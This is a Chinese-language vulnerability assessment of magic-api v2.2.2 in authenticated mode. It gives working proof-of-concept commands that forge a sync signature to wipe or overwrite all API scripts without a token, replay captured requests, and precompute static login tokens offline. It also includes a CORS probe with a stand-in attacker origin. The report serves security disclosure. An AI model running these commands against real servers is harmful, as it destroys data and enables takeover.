## 鉴权模式下新增攻击面（magic-api v2.2.2）

> 以下测试基于 `magic-api.security.username=admin`、`magic-api.security.password=Admin@123456`、`magic-api.secret-key=test-secret-key-123` 配置。

---

### 基线：鉴权边界确认

| 请求 | 无 token 响应 | 结论 |
|---|---|---|
| `POST /magic/web/resource` (资源树) | `code:401, message:token无效` | 需登录 |
| `POST /magic/web/datasource/jdbc/test` | `code:401, message:token无效` | 需登录 |
| `POST /magic/web/backups` (GET 不行) | `code:401, message:token无效` | 需登录 |
| `POST /magic/web/push` | `code:401, message:token无效` | 需登录 |
| `POST /magic/web/resource/file/api/save` | `code:401, message:token无效` | 需登录 |

> 注：HTTP 状态码均为 `200`，错误码在 JSON `code` 字段。浏览器 JS `fetch` 不判断 HTTP status 时会被 200 误导。

---

### 鉴权后仍然可达的未授权端点（`@Valid(requireLogin=false)`）

以下端点**即使配置了认证也无法阻止未登录访问**：

```
GET   /magic/web/                → 重定向至工作台 UI
GET   /magic/web/config.json    → 版本、web路径、prefix 等信息泄露
GET   /magic/web/classes.txt    → 完整类路径枚举（gadget 攻击侦察）
POST  /magic/web/classes        → 详细类信息（含方法签名）
GET   /magic/web/plugins        → 已安装插件列表
ANY   /magic/web/options        → 下拉选项数据
ANY   /magic/web/config-js      → magic-editor JS 配置注入点
POST  /magic/web/login          → 登录接口（预期开放）
POST  /magic/web/logout         → 登出（无实际效果，token 不吊销）
POST  /_magic-api-sync          → receivePush（见下文 F-07 增强版）
```

**影响**：类路径枚举暴露 `java.lang.Runtime`、`ProcessBuilder` 等 RCE gadget 类；`/config-js` 暴露内部配置供攻击者定制工作台脚本注入。

---

### F-07 增强版：receivePush 未授权全量工作区覆盖（鉴权模式下仍可利用）

**关键发现**：`receivePush` 使用 `@Valid(requireLogin=false)`，`UPLOAD_MODE_FULL = "full"`（小写）。攻击者已知 `secretKey` 或截获一次合法请求后，可**无需登录 token** 即覆盖全部 API 脚本。

```bash
# 构造 sign (MD5(timestamp|full|MD5(payload)|secretKey))
TS=$(date +%s%3N)
SIGN=$(python3 - "$TS" <<'EOF'
import hashlib, sys
ts = sys.argv[1]
bmd = hashlib.md5(b'[]').hexdigest()   # 空 payload = 清空全部
print(hashlib.md5(f'{ts}|full|{bmd}|test-secret-key-123'.encode()).hexdigest())
EOF
)

# 发送（无 token, mode=full → 全量模式：先 root.delete() 删除全部文件，再写入 payload）
curl -s -X POST "http://target:9999/_magic-api-sync" \
  -F "file=@/dev/null;type=application/json" \
  -F "mode=full" \
  -F "timestamp=$TS" \
  -F "sign=$SIGN"

# 结果：GET /keepme/k → 404 Not Found
# POST /resource → api groups: [] (全部清空)
```

**重放证明**（无新鲜度校验）：用同一 `(timestamp, sign)` 发送两次，两次均返回 `code:1`。攻击者截获一次合法同步流量后可无限重放。

**注入恶意脚本（RCE）**：将 `[]` 替换为包含恶意 API 定义的 ZipResource 字节流（符合 magic-api 备份格式），mode=full 会先清空再写入，使工作区完全由攻击者控制。

---

### F-06 鉴权模式验证（静态 token + 登出无效）

```bash
# 登录获取 token
TOKEN=$(curl -si -X POST "/magic/web/login" -d "username=admin&password=Admin@123456" \
  | grep -i Magic-Token | awk '{print $2}')
# => b519b303e7df78d9848bca60019bc71c

# 离线预测（无需向服务器发起请求）
python3 -c "import hashlib; print(hashlib.md5(b'admin||Admin@123456').hexdigest())"
# => b519b303e7df78d9848bca60019bc71c  ✓ 预测成功

# 登出
curl -X POST "/magic/web/logout" -H "Magic-Token: $TOKEN"

# 登出后旧 token 仍可访问受保护端点
curl -s -X POST "/magic/web/resource" -H "Magic-Token: $TOKEN"
# => code:1, message:success  (token 未吊销)
```

**结论**：`DefaultAuthorizationInterceptor` 只对比 token 值与 `MD5(username||password)`；`AuthorizationInterceptor.logout()` 空实现，无 token 失效机制；token 静态不变，支持离线预计算。

---

### F-08 鉴权模式验证（CORS 反射）

```bash
curl -si -H "Origin: http://evil.example" "http://target:9999/magic/web/config.json"
# Access-Control-Allow-Origin: http://evil.example
# Access-Control-Allow-Credentials: true
```

**浏览器防护评估**：token 通过 HTTP header（`Magic-Token`）传递，非 Cookie。浏览器 `fetch(credentials:'include')` 跨域时被 CORS 策略限制——`ACAO:*` + `ACAC:true` 组合违反 RFC 规范，实际行为因浏览器而异（Chrome 拒绝，部分旧浏览器允许）。利用门槛高于其他漏洞，但仍为代码缺陷。

---

### 鉴权模式下漏洞影响矩阵

| ID | 鉴权前 | 鉴权后 | 备注 |
|---|---|---|---|
| F-01 未授权 RCE | ✅ 完全可达 | ❌ 需 token | 但 token 可离线计算 → 仍可实现 |
| F-02 JDBC SSRF | ✅ 未授权 | ❌ 需 token | 同上 |
| F-03 源码泄露 | ✅ 未授权 | ❌ 需 token | 同上 |
| F-04 备份/回滚 | ✅ 未授权 | ❌ 需 token | 同上 |
| F-05 /push SSRF | ✅ 未授权 | ❌ 需 token | 同上 |
| **F-06 静态 token** | N/A（无认证） | **⚠️ token 可离线伪造 + 登出无效** | 鉴权后最核心风险 |
| **F-07 receivePush** | ✅ 未授权 | **✅ 仍无需 token** | mode=full 工作区覆盖 |
| **F-08 CORS** | ✅ 反射 | ✅ 仍反射 | 鉴权前后均反射 |
| **F-09 类路径枚举** | N/A | **✅ 仍无需 token** | /classes.txt, /classes |
